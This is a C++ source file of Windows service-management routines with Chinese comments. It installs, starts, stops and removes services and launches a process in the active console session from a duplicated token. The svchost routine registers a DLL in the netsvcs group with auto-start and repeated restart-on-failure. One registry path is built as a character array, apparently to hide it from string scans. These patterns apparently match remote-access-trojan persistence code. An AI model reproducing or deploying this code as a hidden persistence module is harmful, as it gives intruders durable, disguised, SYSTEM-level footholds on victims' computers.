// InstallService.cpp: implementation of the InstallService class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "InstallService.h"
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////


BOOL NtStartService(LPCTSTR lpService)
{
    SC_HANDLE        schSCManager;
    SC_HANDLE        schService;
    SERVICE_STATUS   ServiceStatus;
    DWORD            dwErrorCode;

    schSCManager=OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);//打开服务控制管理器数据库
    if(!schSCManager)
    {
        return FALSE;
    }
    if (NULL!=schSCManager)
    {
        schService=OpenService(schSCManager,lpService,SERVICE_ALL_ACCESS);//获得服务对象的句柄

        if (schService!=NULL)
        {
            if(StartService(schService,0,NULL)==0)//已经存在该服务,就启动服务                        
            {
                dwErrorCode=GetLastError();
                if(dwErrorCode==ERROR_SERVICE_ALREADY_RUNNING)
                {
                    CloseServiceHandle(schSCManager);  
                    CloseServiceHandle(schService);
                    return TRUE;
                }
            }
            else
            {
                return TRUE;
            }
            while(QueryServiceStatus(schService,&ServiceStatus)!=0)           
            {
                if(ServiceStatus.dwCurrentState==SERVICE_START_PENDING)
                {
                    Sleep(100);
                }
                else
                {
                    break;
                }
            }
            CloseServiceHandle(schService);
        }
        CloseServiceHandle(schSCManager);
    }
    else
    {
		return FALSE;
    }
    return TRUE;
}


BOOL NtStopService(LPCTSTR lpService)
{
	SC_HANDLE        schSCManager;
	SC_HANDLE        schService;
	SERVICE_STATUS   RemoveServiceStatus;
	
	schSCManager = OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);//打开服务控制管理器数据库
	if (schSCManager!=NULL)
	{
		schService=OpenService(schSCManager,lpService,SERVICE_ALL_ACCESS);//获得服务对象的句柄
		if (schService!=NULL)
		{		
			if(QueryServiceStatus(schService,&RemoveServiceStatus)!=0)
			{
				if(RemoveServiceStatus.dwCurrentState!=SERVICE_STOPPED)//停止服务
				{
					if(ControlService(schService,SERVICE_CONTROL_STOP,&RemoveServiceStatus)!=0)
					{
						while(RemoveServiceStatus.dwCurrentState==SERVICE_STOP_PENDING)         
						{
							Sleep(10);
							QueryServiceStatus(schService,&RemoveServiceStatus);
						}
					}
				}
			}    
			CloseServiceHandle(schService);
		}	
		CloseServiceHandle(schSCManager);
	}
	else 
	{
		return FALSE;
	}

	return TRUE;
}

//SERVICE_AUTO_START
BOOL NtInstallService(LPCTSTR strServiceName, //服务名称
					  LPCTSTR strDisplayName, //服务显示名称
					  LPCTSTR strDescription, //服务描述
					  LPCTSTR strPathName,    //可执行文件的路径
					  LPCTSTR Dependencies,   //指定启动该服务前必须先启动的服务或服务组,一般为NULL
					  BOOLEAN KernelDriver,   //是否安装驱动程序
					  ULONG   StartType       //启动类型
					  )
{
    BOOL bRet = FALSE;
    SC_HANDLE svc=NULL, scm=NULL;
    __try
    {
        scm = OpenSCManager(0, 0,SC_MANAGER_ALL_ACCESS);
        if (!scm)
		{
            return -1;
        }
		svc = CreateService(
            scm, 
            strServiceName, 
            strDisplayName,
            SERVICE_ALL_ACCESS,// SERVICE_ALL_ACCESS
            KernelDriver ? SERVICE_KERNEL_DRIVER : SERVICE_WIN32_OWN_PROCESS| SERVICE_INTERACTIVE_PROCESS,
            StartType,
            SERVICE_ERROR_IGNORE,
            strPathName,
            NULL, NULL, Dependencies, NULL, NULL);
		
        if (svc == NULL)
        {
            if (GetLastError() == ERROR_SERVICE_EXISTS)
            {
                svc = OpenService(scm,strServiceName,SERVICE_ALL_ACCESS);
                if (svc==NULL)
                    __leave;
                else
                    StartService(svc,0, 0);
            }
        }

		SERVICE_FAILURE_ACTIONS sdBuf={0};
		ChangeServiceConfig2(svc, SERVICE_CONFIG_DESCRIPTION, &sdBuf);
		sdBuf.lpRebootMsg=NULL;
		sdBuf.dwResetPeriod=NULL;
		
		SC_ACTION action[3];
		action[0].Delay=5000;
		action[0].Type=SC_ACTION_RESTART;
		action[1].Delay=0;
		action[1].Type=SC_ACTION_RESTART;
		action[2].Delay=0;
		action[2].Type=SC_ACTION_RESTART;
		sdBuf.cActions=3;
		sdBuf.lpsaActions=action;
		sdBuf.lpCommand=NULL;
		ChangeServiceConfig2(svc, SERVICE_CONFIG_FAILURE_ACTIONS, &sdBuf);
		
		char str[] = {'S','Y','S','T','E','M','\\','C','u','r','r','e','n','t','C','o','n','t','r','o','l','S','e','t','\\','S','e','r','v','i','c','e','s','\\','%','s','\0'};
		// "SYSTEM\\CurrentControlSet\\Services\\%s"
        TCHAR Desc[MAX_PATH];
        wsprintfA(Desc,str, strServiceName);

		WriteRegEx(HKEY_LOCAL_MACHINE, 
			Desc, 
			"Description", 
			REG_SZ, 
			(char*)strDescription, 
			lstrlen(strDescription), 
			0);			
	
        if (!StartService(svc,0, 0))
            __leave;
		
        bRet = TRUE;
    }
    __finally
    {
        if (svc!=NULL)
            CloseServiceHandle(svc);
        if (scm!=NULL)
            CloseServiceHandle(scm);
    }
	
    return bRet;
}

BOOL NtInstallSvchostService(LPCTSTR strServiceName, 
                           LPCTSTR strDisplayName, 
                           LPCTSTR strDescription,
                           LPCTSTR strDllPath)
{
    BOOL bRet = FALSE;
    TCHAR szOpenKey[MAX_PATH] = {0};

    try
    {
	  wsprintfA(szOpenKey,"%%SystemRoot%%\\System32\\svchost.exe -k \"%s\"",strServiceName);
      bRet = NtInstallService(strServiceName,
                     strDisplayName,
                     strDescription,
                     szOpenKey,
                     NULL,
                     false,
                     SERVICE_AUTO_START); //安装服务,并设置为自动启动

        //修改dll指向
        wsprintfA(szOpenKey,	"SYSTEM\\CurrentControlSet\\Services\\%s\\Parameters", strServiceName);

		WriteRegEx(HKEY_LOCAL_MACHINE, 
			szOpenKey, 
			"ServiceDll", 
			REG_EXPAND_SZ, 
			(char*)strDllPath, 
			lstrlen(strDllPath), 
			0);			

        //添加服务名到netsvcs组
        ZeroMemory(szOpenKey,sizeof(szOpenKey));
        lstrcpy(szOpenKey, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost");

		WriteRegEx(HKEY_LOCAL_MACHINE, 
			szOpenKey, 
			strServiceName, 
			REG_MULTI_SZ, 
			(char *)strServiceName, 
			lstrlen(strServiceName),
			1);			

        bRet = NtStartService(strServiceName);
    }
    catch(...){}

    return bRet;
}

void NtUninstallService(LPCTSTR ServiceName)
{
	if (!lstrlen(ServiceName))
		return;

//	NtStopService(ServiceName);

	SC_HANDLE scm,svc;

	scm=OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (scm!=NULL)
	{
		svc=OpenService(scm, ServiceName, SERVICE_ALL_ACCESS);
		if (svc!=NULL)
		{
			DeleteService(svc);
			CloseServiceHandle(svc);
		}
		CloseServiceHandle(scm);
	}

	WriteRegEx(HKEY_LOCAL_MACHINE,
		"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost",
		ServiceName,
		NULL,
		NULL,
		NULL,
		3);
}

#include "Wtsapi32.h"
HANDLE RunInActiveSession(LPCTSTR lpCommandLine)
{
	HANDLE hProcess;
	HANDLE result;
	HANDLE hProcessInfo;


	LPVOID lpEnvironment = NULL;
	DWORD TokenInformation = 0;
	HANDLE hExistingToken = NULL;
	HANDLE hObject = NULL;

	STARTUPINFO StartupInfo = {0};
	PROCESS_INFORMATION ProcessInfo = {0};
 

	ProcessInfo.hProcess = 0;
	ProcessInfo.hThread = 0;
	ProcessInfo.dwProcessId = 0;
	ProcessInfo.dwThreadId = 0;
	StartupInfo.cb = 68;
	StartupInfo.lpDesktop = "WinSta0\\Default";

	hProcess = GetCurrentProcess();
	OpenProcessToken(hProcess, 0xF01FFu, &hExistingToken);
	DuplicateTokenEx(hExistingToken,  0x2000000u, NULL, SecurityIdentification, TokenPrimary, &hObject);
 	
	if ( WTSGetActiveConsoleSessionId )
	{
		TokenInformation = WTSGetActiveConsoleSessionId();

		SetTokenInformation(hObject, TokenSessionId, &TokenInformation, sizeof(DWORD));

		CreateEnvironmentBlock(&lpEnvironment, hObject, false);

	//	WTSQueryUserToken(TokenInformation,&hObject);

		CreateProcessAsUser(
			hObject,
			NULL,
			(TCHAR*)lpCommandLine,
			NULL,
			NULL,
			false,
			0x430u,
			lpEnvironment,
			NULL,
			&StartupInfo,
			&ProcessInfo);

		hProcessInfo = ProcessInfo.hProcess;

		CloseHandle(hObject);
		CloseHandle(hExistingToken);
		result = hProcessInfo;
	}
	else
	{
		result = 0;
	}


	return result;
}

